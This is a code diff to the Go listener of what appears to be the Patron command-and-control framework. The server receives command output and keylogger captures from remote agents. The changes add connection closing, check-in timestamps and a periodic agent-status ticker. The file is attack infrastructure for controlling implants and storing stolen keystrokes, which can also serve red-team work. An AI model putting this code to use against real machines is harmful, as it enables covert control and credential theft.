@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/types"
@@ -28,6 +29,7 @@ func goDotEnvVariable(key string) string {
 	return os.Getenv(key)
 }
 
+//make it central
 func IsValidUUID(u string) bool {
 	_, err := uuid.Parse(u)
 	return err == nil
@@ -35,6 +37,7 @@ func IsValidUUID(u string) bool {
 
 func handleconn(connection net.Conn) {
 	for {
+
 		text, _ := bufio.NewReader(connection).ReadString('\n')
 		message := strings.Split(text, "\n")
 		// fmt.Println(message[0])
@@ -82,10 +85,18 @@ func handleconn(connection net.Conn) {
 
 							if destruct.Result == "2" {
 								logger.Logf(logger.Debug, "Agent %s Sent Nothing Back\n", uid)
+								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
 								data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, fetch.Uuid)
+								if destruct.Output == "~Killed~" {
+									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
+									connection.Close()
+								}
+								connection.Close()
 							}
+							now := time.Now()
+							data.UpdateAgentCheckIn(uid, now.Unix())
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
 							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
@@ -102,21 +113,29 @@ func handleconn(connection net.Conn) {
 							if destruct.Keys != "" {
 								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
 								data.UpdateAgentKeys(uid, destruct.Keys)
+								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
+								connection.Close()
 							}
+							now := time.Now()
+							data.UpdateAgentCheckIn(uid, now.Unix())
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
+							connection.Close()
 						}
 					} else {
 						// agent not in database!!!
 						logger.Logf(logger.Info, "Unknown Agent, Wrong Key\n")
+						connection.Close()
 					}
 				} else {
 					logger.Logf(logger.Info, "Invalid UUID\n")
+					connection.Close()
 				}
 			} else {
 				logger.Logf(logger.Info, "Wrong blob count\n")
+				connection.Close()
 			}
 		}
 	}
@@ -142,15 +161,22 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+	// Update Agent status ricker
+	ticker := time.Tick(5 * time.Second)
 
 	defer listener.Close()
 	for {
-		connection, err := listener.Accept()
-		if err != nil {
-			log.
-				Fatalln(err)
+		select {
+		case <-ticker:
+			go data.UpdateAgentStatus()
+		default:
+			connection, err := listener.Accept()
+			if err != nil {
+				log.
+					Fatalln(err)
+			}
+			go handleconn(connection)
 		}
-		go handleconn(connection)
 
 	}
 }
